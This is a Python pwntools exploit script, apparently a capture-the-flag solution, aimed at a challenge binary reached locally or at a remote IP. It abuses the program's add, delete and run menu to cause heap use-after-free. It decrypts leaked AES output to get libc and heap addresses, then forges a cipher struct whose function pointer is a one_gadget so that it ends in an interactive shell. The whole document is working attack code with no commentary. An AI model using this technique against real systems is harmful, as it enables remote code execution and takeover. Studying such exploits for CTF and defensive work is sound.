#!/usr/bin/env python
from pwn import *
from Crypto.Cipher import AES

key = 'A' * 0x20
iv = 'A' * 0x10

def add(id, type, data, skip=False):
    s.sendline('1')
    s.sendline(str(id))
    s.sendline(str(type))
    s.send(key)
    s.send(iv)
    s.sendline(str(len(data)))
    if not skip:
        s.send(data)

def delete(id):
    s.sendline('2')
    s.sendline(str(id))

def go(id):
    s.sendline('3')
    s.sendline(str(id))

def decrypt(size):
    s.recvuntil('Ciphertext: \n')
    enc = ''
    while size > 0:
        enc += ''.join(map(lambda x: x.decode('hex'), s.recvline(False).split(' ')))
        size -= 0x10
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.decrypt(enc)

local = len(sys.argv) == 1

if local:
    s = process('./task_52f1358baddfd3d4026da4d8c0735e52')
else:
    s = remote('111.186.63.201', 10001)

add(0, 1, 'A' * 0x1000)
go(0)
time.sleep(1 if local else 1.3)
go(0)
add(1, 1, 'B' * 0x1000)
add(2, 1, 'C' * 0x1000)
delete(2)
delete(1)
delete(0)
add(0, 1, 'A' * 0x1000, True)
res = decrypt(0x10)
s.send('A' * 0x1000)
libc_base = u64(res[:8]) - 0x3ebca0
log.info('libc base: %#x' % libc_base)
heap_base = u64(res[8:]) - 0x14b0
log.info('heap base: %#x' % heap_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

cipher = ''
cipher += p32(0)
cipher += p32(0) # block size
cipher += p32(0x20) # key len
cipher += p32(0x10) # iv len
cipher += p64((1<<64)-1) # flags
cipher += p64(0) # init
cipher += p64(libc_base + one_gadgets[2]) # do_cipher
cipher_addr = heap_base + 0x2950

ctx = ''
ctx += p64(cipher_addr) # cipher
ctx += p64(0xdeadbeef) # engine
ctx += p32(1) # encrypt
ctx_addr = cipher_addr + len(cipher)

add(1, 1, 'B' * 0x70)
delete(0)
delete(1)
add(1, 1, cipher + ctx)

task = ''
task += 'A' * 0x58
task += p64(ctx_addr)
task = task.ljust(0x70)

add(0, 1, task)

s.interactive()
